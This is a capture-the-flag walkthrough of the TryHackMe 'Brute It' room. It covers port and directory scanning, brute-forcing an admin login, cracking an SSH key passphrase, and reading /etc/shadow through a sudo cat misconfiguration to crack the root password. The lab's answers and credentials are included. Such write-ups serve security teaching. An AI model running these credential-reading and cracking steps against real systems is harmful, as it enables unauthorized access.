---

Name: Brute It
Difficulty: Easy
URL: https://tryhackme.com/room/bruteit
Description: Learn how to brute, hash cracking and escalate privileges in this box!

---

# Reconnaissance
Let's use rustscan to gather more information about the ports
```bash
$ rustscan -a brute.thm -r 1-65535 --ulimit 5000 -- -sC -sV

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDddsKhK0u67HTcGJWVdm5ukT2hHzo8pDwrqJmqffotf3+4uTESTdRdr2UgZhPD5ZAvVubybTc5HSVOA+CQ6eWzlmX1LDU3lsxiWEE1RF9uOVk3Kimdxp/DI8ILcJJdQlq9xywZvDZ5wwH+zxGB+mkq1i8OQuUR+0itCWembOAj1NvF4DIplYfNbbcw1qPvZgo0dA+WhPLMchn/S8T5JMFDEvV4TzhVVJM26wfBi4o0nslL9MhM74XGLvafSa5aG+CL+xrtp6oJY2wPdCSQIFd9MVVJzCYuEJ1k4oLMU1zDhANaSiScpEVpfJ4HqcdW+zFq2YAhD1a8CsAxXfMoWowd
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMPHLT8mfzU6W6p9tclAb0wb1hYKmdoAKKAqjLG8JrBEUZdFSBnCj8VOeaEuT6anMLidmNO06RAokva3MnWGoys=
|   256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEoIlLiatGPnlVn/NBlNWJziqMNrvbNTI5+JbhICdZ6/
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

## How many ports are open?
```text
2
```


## What version of SSH is running?
```text
OpenSSH 7.6p1
```

## What version of Apache is running?
```text
2.4.29
```

## Which Linux distribution is running?
```text
Ubuntu
```

## What is the hidden directory?
For this one I have used gobuster:
```bash
$ gobuster dir -url http://brute.thm/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 100 -x txt,php,html,bak,zip,log,old,js -k
admin                (Status: 301) [Size: 306] [--> http://brute.thm/admin/]
```

# Getting a shell
## What is the user:password of the admin panel?
While inspecting the page source we find a note:
```html
    <!-- Hey john, if you do not remember, the username is admin -->
```

I brute forced the password with Caido, the credentials are:
```
admin:xavier
```

Now we can download the key

## What is John's RSA Private Key passphrase?

```bash
ssh2john.py id_rsa > id_rsa.hash
```

```bash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
rockinroll       (id_rsa)
```

```bash
chmod 600 id_rsa
ssh -i id_rsa john@brute.thm
```

## user.txt
```bash
cat user.txt
```

## Web flag
Is displayed after logging in with the credentials

# Privilege Escalation
## What is the root's password?
```bash
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

```bash
john@bruteit:~$ sudo /bin/cat /etc/shadow
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
```

We have the password hash now
```bash
$6$zdk0.jUm$Vya24cGzM1duJkw5M5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.
```

We just have to crack it:
```bash
$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
football         (?)
```


## root.txt
```bash
sudo /bin/cat /root/root.txt
```
